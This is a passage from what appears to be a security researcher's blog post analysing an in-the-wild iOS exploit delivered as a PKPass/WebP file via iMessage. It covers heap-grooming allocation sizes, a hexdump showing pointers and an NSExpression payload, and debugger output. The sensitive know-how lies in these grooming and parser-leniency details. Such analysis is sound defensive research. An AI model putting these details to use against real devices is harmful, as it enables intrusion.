 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;XQFzMDWmii-c41&quot;&gt;&lt;tr class=&quot;XQFzMDWmii-c28&quot;&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Object Size&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Count&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;XQFzMDWmii-c28&quot;&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;0x3FFFFF&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;44&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;XQFzMDWmii-c28&quot;&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;0xFFFFF&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;80&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;XQFzMDWmii-c28&quot;&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;0x3FFF&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;20&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;XQFzMDWmii-c28&quot;&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;0x26A9&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;24978&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;XQFzMDWmii-c28&quot;&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;0x2554&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;44&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;XQFzMDWmii-c28&quot;&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;0x23FF&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;5822&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;XQFzMDWmii-c28&quot;&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;0x22A9&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;4&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;XQFzMDWmii-c28&quot;&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;0x1FFF&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;2&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;XQFzMDWmii-c28&quot;&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;0x1EA9&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;26&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;XQFzMDWmii-c28&quot;&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;0x1D54&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;40&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;XQFzMDWmii-c28&quot;&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;0x17FF&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;66&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;XQFzMDWmii-c28&quot;&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;0x13FF&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;66&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;XQFzMDWmii-c28&quot;&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;0x3FF&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;322&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;XQFzMDWmii-c28&quot;&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;0x3D7&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;404&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;XQFzMDWmii-c28&quot;&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;0xF&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;112882&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;XQFzMDWmii-c28&quot;&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;0x8&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;XQFzMDWmii-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;3&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;There are a large number of allocations which fall just below a &amp;quot;round&amp;quot; number in hexadecimal: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x3ff&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x13ff&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x17ff&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x1fff&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x23ff&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x3fff&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;... That heavily hints that they are sized to fall exactly within certain allocator size buckets.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Almost all of the allocations are just filled with zeros or &amp;#39;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;#39;s. But the 1MB one is quite different:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;$ hexdump -C 170ae757_80.bin | head -n 20&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000000 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;|................|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000010 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;80 26 00 00 01 00 00 00 &amp;nbsp;|.........&amp;amp;......|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000020 &amp;nbsp;1f 00 00 00 00 00 00 00 &amp;nbsp;10 00 8b 56 02 00 00 00 &amp;nbsp;|...........V....|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000030 &amp;nbsp;b0 c3 31 16 02 00 00 00 &amp;nbsp;60 e3 01 00 00 00 00 00 &amp;nbsp;|..1.....`.......|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000040 &amp;nbsp;20 ec 46 58 02 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;| .FX............|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000050 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;|................|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000060 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;60 bf 31 16 02 00 00 00 &amp;nbsp;|........`.1.....|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000070 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;|................|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;*&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;000004b0 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;10 c4 31 16 02 00 00 00 &amp;nbsp;|..........1.....|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;000004c0 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;|................|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;*&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;000004e0 &amp;nbsp;02 1c 00 00 01 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;|................|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;000004f0 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;|................|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000500 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;70 80 33 16 02 00 00 00 &amp;nbsp;|........p.3.....|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000510 &amp;nbsp;b8 b5 e5 57 02 00 00 00 &amp;nbsp;ff ff ff ff ff ff ff ff &amp;nbsp;|...W............|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000520 &amp;nbsp;58 c4 31 16 02 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;|X.1.............|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000530 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;|................|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;*&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000550 &amp;nbsp;50 75 2c 18 02 00 00 00 &amp;nbsp;01 00 00 00 00 00 00 00 &amp;nbsp;|Pu,.............|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Further on in the hexdump of the 1MB object there&amp;#39;s clearly an &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;NSExpression&lt;/span&gt;&lt;span&gt;&amp;nbsp;payload - this payload is also visible just running &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;strings&lt;/span&gt;&lt;span&gt;&amp;nbsp;on the WebP file. Matthias Frielingsdorf from iVerify gave a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://i.blackhat.com/Asia-24/Asia-24-Frielingsdorf-YouShallNotPassAnalysing.pdf&quot;&gt;talk at BlackHat Asia with an initial analysis of this NSExpression payload&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;, we&amp;#39;ll return to that at the end of this blog post.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Equally striking (and visible in the hexdump above): there are clearly pointers in there. It&amp;#39;s too early in the analysis to know whether this is a payload which gets rebased somehow, or whether there&amp;#39;s a separate ASLR disclosure step.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;On a slightly higher level this hexdump looks a little bit like an Objective-C or C++ object, though some things are strange. Why are the first 24 bytes all zero? Why isn&amp;#39;t there an isa pointer or vtable? It looks a bit like there are a number of integer fields before the pointers, but what are they? At this stage of the analysis, I had no idea.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.m4inyehexyvr&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;Thinking dynamically&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;I had tried a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c25&quot;&gt;lot&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;to reproduce the exploit primitives on a real device; I built tooling to dynamically generate and sign legitimate PKPass files that I could send via iMessage to test devices and I could crash a lot, but I never seemed to get very far into the exploit - the iOS version range where the heap grooming works seems to be pretty small, and I didn&amp;#39;t have an exact device and iOS version match to test on.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Regardless of what I tried: sending the original exploits via iMessage, sending custom PKPasses with the trigger and groom, rendering the WebP directly in a test app or trying to use the PassKit APIs to render the PKPass file the best I could manage dynamically was to trigger a heap metadata integrity check failure, which I assumed was indicative of the exploit failing.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;(Amusingly, using the legitimate APIs to render the PKPass inside an app failed with an error that the PKPass file was malformed. And indeed, the exploit sample PKPass is malformed: it&amp;#39;s missing multiple required files. But the &amp;quot;secure&amp;quot; PKPass BlastDoor parser entrypoint (&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;PKPassSecurePreviewContextCreateMessagesPreview&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;) is, in this regard at least, less strict and will attempt to render an incomplete and invalid PKPass).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Though getting the whole PKPass parsed was proving tricky, with a bit of reversing it was possible to call the correct underlying CoreGraphics APIs to render the WebP and also get the EXIF/MakerNote parsed. By then setting a breakpoint when the huffman tables were allocated I had hoped it would be obvious what the overflow target was. But it was actually totally unclear what the following object was: (Here &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;3&lt;/span&gt;&lt;span&gt;&amp;nbsp;points to the start of the huffman tables which are &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x3000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;bytes large)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;(lldb) x/6xg $x3+0x3000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;0x112000000: 0x0000000111800000 0x0000000000000000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;0x112000010: 0x00000000001a1600 0x0000000000000004&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;0x112000020: 0x0000000000000001 0x0000000000000019&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The first qword (&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x111800000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;) is a valid pointer, but this is clearly not an Objective-C object, nor did it seem to look like any other recognizable object or have much to do with either the bplist or WebP. But running the tests a few times, there was a curious pattern:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;(lldb) x/6xg $x3+0x3000&lt;/span&gt;&lt;/p&gt;
